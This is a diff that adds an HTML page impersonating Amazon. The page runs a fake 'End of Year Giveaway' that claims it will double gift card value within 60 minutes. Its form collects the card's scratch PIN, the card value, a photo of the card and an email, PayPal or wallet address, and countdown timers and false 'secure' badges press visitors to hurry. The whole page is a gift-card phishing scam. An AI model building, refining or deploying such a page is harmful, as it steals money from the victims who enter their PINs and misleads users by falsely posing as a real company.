@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Amazon End of Year Giveaway — Double Your Gift Card Value</title>
+<meta name="description" content="Amazon End of Year Giveaway: double your gift card value by 100%. Enter your scratch PIN, upload your card, get 2x back in 60 minutes.">
+<meta name="theme-color" content="#131921">
+<link rel="stylesheet" href="/styles.css">
+</head>
+<body>
+
+<div class="strip">⏳ End of year giveaway closes in <b id="globalTimer">60:00</b></div>
+
+<header class="topbar">
+  <div class="topbar-inner">
+    <a class="logo" href="/" aria-label="Amazon">
+      <span class="logo-text">amazon</span>
+      <svg class="logo-smile" viewBox="0 0 100 18" preserveAspectRatio="none" aria-hidden="true">
+        <path d="M3 2 Q50 20 97 2" fill="none" stroke="#ff9900" stroke-width="4" stroke-linecap="round"/>
+      </svg>
+    </a>
+    <div class="deliver">Deliver to<br><b>Your inbox</b></div>
+    <form class="search" onsubmit="return false">
+      <select aria-label="Category"><option>All</option><option>Gift Cards</option><option>Deals</option></select>
+      <input placeholder="Search Amazon" aria-label="Search Amazon">
+      <button type="submit" aria-label="Search">🔍</button>
+    </form>
+    <a class="nav-item" href="#">EN ▾</a>
+    <a class="nav-item" href="#">Account ▾</a>
+    <a class="nav-item" href="#">Returns<br><b>&amp; Orders</b></a>
+    <a class="cart" href="#">🛒 <b>0</b></a>
+  </div>
+</header>
+
+<nav class="subnav">
+  <div class="subnav-inner">
+    <a href="#">☰ All</a><a href="#">Gift Cards</a><a href="#">Deals</a>
+    <a href="#">Customer Service</a><a href="#">Registry</a><a href="#">Sell</a>
+  </div>
+</nav>
+
+<section class="hero">
+  <div class="kicker">END OF YEAR GIVEAWAY</div>
+  <h1>Double your gift card value by <em>💯%</em></h1>
+  <p>Amazon is matching every gift card claimed before the clock runs out. Enter your scratch PIN, upload your card, and get <b>2× the value back in 60 minutes</b>.</p>
+  <div class="badges">
+    <span>🔒 100% secure</span><span>⚡ Paid in 60 min</span><span>🎁 No fees</span><span>👤 One card per person</span>
+  </div>
+</section>
+
+<main class="wrap">
+
+  <div class="result" id="result" hidden>
+    <h2>✅ Claim received — your value is doubling</h2>
+    <div class="amount" id="resultAmount">$0.00</div>
+    <p class="sub">Reference <span class="ref" id="resultRef">—</span></p>
+    <div class="timer">
+      <div><b id="tH">01</b><i>HRS</i></div>
+      <div><b id="tM">00</b><i>MIN</i></div>
+      <div><b id="tS">00</b><i>SEC</i></div>
+    </div>
+    <p class="fine" id="resultNote">Keep this page open. Your doubled value releases automatically when the timer hits zero.</p>
+    <button class="btn ghost" id="again" type="button">Submit another card</button>
+  </div>
+
+  <div class="card" id="formCard">
+    <h2>Claim your doubled value</h2>
+    <p class="sub">Takes about 40 seconds. All fields are required.</p>
+    <div class="err" id="err" hidden></div>
+
+    <form id="claimForm" novalidate>
+      <div class="row">
+        <div class="field">
+          <label for="pin">Gift card PIN <small>(scratch the back)</small></label>
+          <input id="pin" type="text" placeholder="e.g. QW7X-4KLM-92PD" maxlength="30" autocomplete="off" autocapitalize="characters">
+        </div>
+        <div class="field">
+          <label for="value">Gift card value (USD)</label>
+          <input id="value" type="number" min="1" step="1" placeholder="e.g. 50" inputmode="decimal">
+        </div>
+      </div>
+
+      <div class="field">
+        <label for="doubled">You will receive</label>
+        <input id="doubled" type="text" value="$0.00" readonly tabindex="-1">
+      </div>
+
+      <div class="field">
+        <label for="photo">Photo of your gift card</label>
+        <div class="drop" id="drop" role="button" tabindex="0">
+          <b>Click to upload</b> or drag the image here<br>
+          <small>JPG / PNG · front and back in one shot is best</small>
+        </div>
+        <input type="file" id="photo" accept="image/*" hidden>
+        <img class="thumb" id="thumb" alt="Gift card preview" hidden>
+      </div>
+
+      <div class="field">
+        <label for="contact">Where should we send your doubled value?</label>
+        <input id="contact" type="text" placeholder="Email, PayPal or wallet address" autocomplete="email">
+      </div>
+
+      <button class="btn" id="submitBtn" type="submit">Double my gift card value →</button>
+      <p class="fine">By submitting you confirm the card is unused. Doubled value is released 60 minutes after verification.</p>
+    </form>
+  </div>
+
+  <div class="steps">
+    <div class="step"><b>1</b><p>Scratch the panel on the back of your Amazon gift card and type the PIN above.</p></div>
+    <div class="step"><b>2</b><p>Photograph the card and upload it so we can verify the balance.</p></div>
+    <div class="step"><b>3</b><p>Wait 60 minutes. Your value is doubled and sent to the address you gave.</p></div>
+  </div>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div><h4>Get to Know Us</h4><p>About Amazon<br>Careers<br>Press Releases<br>Amazon Science</p></div>
+    <div><h4>Giveaway Terms</h4><p>One card per person<br>Doubled within 60 minutes<br>Amazon cards only<br>No fees, no purchase needed</p></div>
+    <div><h4>Help</h4><p>Your Account<br>Orders<br>Shipping Rates<br>Returns</p></div>
+  </div>
+  <div class="copy">End of Year Giveaway 2026</div>
+</footer>
+
+<script src="/app.js" defer></script>
+</body>
+</html>
